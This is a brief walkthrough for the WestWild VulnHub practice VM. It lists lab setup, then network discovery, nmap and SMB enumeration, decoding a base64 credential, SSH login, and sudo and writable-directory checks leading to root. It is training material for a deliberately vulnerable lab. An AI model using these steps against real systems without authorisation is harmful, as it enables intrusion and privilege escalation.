# Wild-West-VulnHub


- Go to the link : **[https://www.vulnhub.com/entry/basic-pentesting-1,216/]([https://www.vulnhub.com/entry/westwild-11,338/](https://www.vulnhub.com/entry/westwild-11,338/))**
- Download the __.ova__ file
- Download Virtual Box : **https://www.virtualbox.org/wiki/Downloads**
- In VirtualBox, to import the __.ova__ file head to *File → Import Appliance*
- Make sure to check for the network adapter *Network → Bridged Adapter*

---

- Get IP
    
    ```bash
    netdiscover
    ```
    
- Save the vulnerable device IP in a file

    ```
    IP > csec_ip
    ```
- Check the services using nmap
    
    ```bash
    nmap -A -vv IP
    ```

    ```bash
    enum4linux IP
    smbclient -L //IP
    smbclient //IP/USER
    get FLAG.txt
    get avenge.txt
    ```
    
- for hashed code, 
    
    ```bash
    echo "HASH_CODE" | base64 -d
    ```
    
    ```bash
    ssh USER@IP
    ```
    
    ```bash
    sudo -l
    ```
    
- Use priviledge escalation
    
    ```bash
    find / -writable -type d 2>/dev/null
    ```
    
    ```bash
    check all the files
    ```
    
    ```bash
    su USER2
    sudo -l
    su
    sudo -i
    ```
